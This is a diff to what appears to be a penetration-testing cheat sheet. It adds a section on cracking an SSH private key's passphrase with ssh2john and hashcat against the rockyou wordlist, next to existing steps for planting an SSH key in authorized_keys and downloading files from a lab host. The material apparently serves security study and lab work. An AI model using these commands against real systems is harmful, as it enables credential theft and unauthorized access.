@@ -239,7 +239,7 @@ curl http://192.168.45.176/<FILE> > <OUTPUT_FILE>
 
 # SSH
 ## SSH KEYGEN
-```
+```bash
 kali@kali:~$ ssh-keygen
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/kali/.ssh/id_rsa): fileup
@@ -250,6 +250,15 @@ Your public key has been saved in fileup.pub
 ...
 
 kali@kali:~$ cat fileup.pub > authorized_keys
+```
+
+## SSH 
+```bash
+kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash
+
+kali@kali:~/passwordattacks$ cat ssh.hash
+id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
+kali@kali: hashcat -m 22921 ssh.hash /usr/share/wordlists/rockyou.txt --force
 ```
 
 
